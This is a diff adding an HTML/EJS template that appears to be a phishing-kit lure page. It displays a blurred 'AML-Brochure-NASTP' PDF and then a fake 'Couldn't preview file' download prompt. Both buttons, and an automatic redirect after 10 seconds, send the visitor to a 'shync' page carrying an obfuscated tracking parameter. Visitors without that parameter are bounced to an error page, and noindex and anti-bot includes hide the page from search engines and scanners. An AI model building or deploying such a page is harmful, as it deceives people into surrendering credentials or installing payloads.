@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="SHORTCUT ICON" href="/image/pdf.png">
+  <title>AML-Brochure-NASTP</title>
+ <%- include('partials/meta-noindex') %>
+  
+  <style>
+html, body {
+  height: 100%;
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #000;
+  overflow: hidden;
+}
+
+.pdf-container {
+  position: relative;
+  width: 100%;
+  height: 100%;
+}
+
+.pdf-container embed {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+}
+
+#blurOverlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  z-index: 10;
+  backdrop-filter: blur(6px);
+  background-color: rgba(255, 255, 255, 0.1);
+  opacity: 0;
+  transition: opacity 1s ease;
+  pointer-events: none;
+}
+
+#blurOverlay.visible {
+  opacity: 1;
+}
+
+.overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0, 0, 0, 0.3);
+  display: none;
+  justify-content: center;
+  align-items: center;
+  z-index: 999;
+  flex-direction: column;
+}
+
+.modal {
+  position: relative;
+  background: rgb(70, 69, 69);
+  border-radius: 8px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+  width: 520px;
+  padding: 12px 20px;
+  animation: fadeIn 0.5s ease;
+  transform: translateX(150px);
+  z-index: 1000;
+}
+
+.modal h4 {
+  margin: 0;
+  font-size: 16px;
+}
+
+.modal p {
+  font-size: 14px;
+  margin: 16px 0;
+}
+
+.buttons {
+  text-align: left;
+  padding-left: 100px;
+}
+
+.btn {
+  background: #eee;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  padding: 8px 30px;
+  margin-left: 10px;
+  font-size: 12px;
+  font-weight: bold;
+  cursor: pointer;
+  text-decoration: none;
+  color: #333;
+}
+
+.btn.blue {
+  background-color: #007bff;
+  color: white;
+  border: none;
+}
+
+.btn:hover {
+  opacity: 0.9;
+}
+
+
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateX(150px) scale(0.9); }
+  to { opacity: 1; transform: translateX(150px) scale(1); }
+}
+
+
+</style>
+
+</head>
+
+</head>
+<body>
+
+  <div class="pdf-container" id="pdfContainer">
+    <embed src="AML-Brochure-NASTP.pdf" type="application/pdf">
+    <div id="blurOverlay"></div>
+  </div>
+
+<div class="overlay" id="popup">
+  <div class="modal">
+
+    <center><h4 style="font-family:  Arial, Helvetica, sans-serif; font-size: 16px; color: rgb(255, 255, 255);"> Couldn't preview file</h4></center>
+    <br>
+    <center><p style="margin: 0; font-size: 15.5px; color: rgb(255, 255, 255);">
+      <span style=" font-family:  Arial, Helvetica, sans-serif;"> You may be offline or with limited connectivity. Try downloading instead.</span>
+    </p></center>
+    <br><br>
+    <div class="buttons">
+      <a href="#" class="btn blue" id="acceptBtn" style="display: inline-flex; align-items: center; gap: 20px;"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="white" stroke="white" stroke-width="1" viewBox="0 0 16 16"><path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"/><path d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"/></svg>Download</a>
+      <a href="#" class="btn" id="connectBtn" style="display: inline-flex; align-items: center; gap: 10px; margin-left: 15px; background: white; color: rgb(37, 36, 36); font-weight: bold; padding: 8px 20px; border: none;"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor" stroke="currentColor" stroke-width="1" viewBox="0 0 16 16"><path d="M8 1a.5.5 0 0 1 .5.5v6h6a.5.5 0 0 1 0 1h-6v6a.5.5 0 0 1-1 0v-6h-6a.5.5 0 0 1 0-1h6v-6A.5.5 0 0 1 8 1z"/></svg>Connect more apps....</a>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+ <script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const urlParams = new URLSearchParams(window.location.search);
+
+    // ✅ Show the modal popup after 2 seconds
+    setTimeout(() => {
+      const popup = document.getElementById('popup');
+      if (popup) {
+        popup.style.display = 'flex';
+      }
+    }, 2500);
+
+    // Button click handlers
+    const acceptBtn = document.getElementById('acceptBtn');
+    const connectBtn = document.getElementById('connectBtn');
+
+    if (acceptBtn) {
+      acceptBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        const paramValue = urlParams.get('mxowuwonvdmbqrrwewosnadgdhgdui') || '';
+        window.location.href = 'shync?chbsdgereoihoefoehoehohegei=' + encodeURIComponent(paramValue);
+      });
+    }
+
+    if (connectBtn) {
+      connectBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        const paramValue = urlParams.get('mxowuwonvdmbqrrwewosnadgdhgdui') || '';
+        window.location.href = 'shync?chbsdgereoihoefoehoehohegei=' + encodeURIComponent(paramValue);
+      });
+    }
+
+  });
+</script>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+
+    if (!urlParams.has("mxowuwonvdmbqrrwewosnadgdhgdui")) {
+        window.location.href = "error";
+    } else {
+        const paramValue = urlParams.get("mxowuwonvdmbqrrwewosnadgdhgdui") || '';
+        setTimeout(() => {
+            window.location.href = "shync?chbsdgereoihoefoehoehohegei=" + encodeURIComponent(paramValue);
+        }, 10000);
+    }
+  </script>
+
+<%- include('partials/antibot') %>
+</body>
+</html>
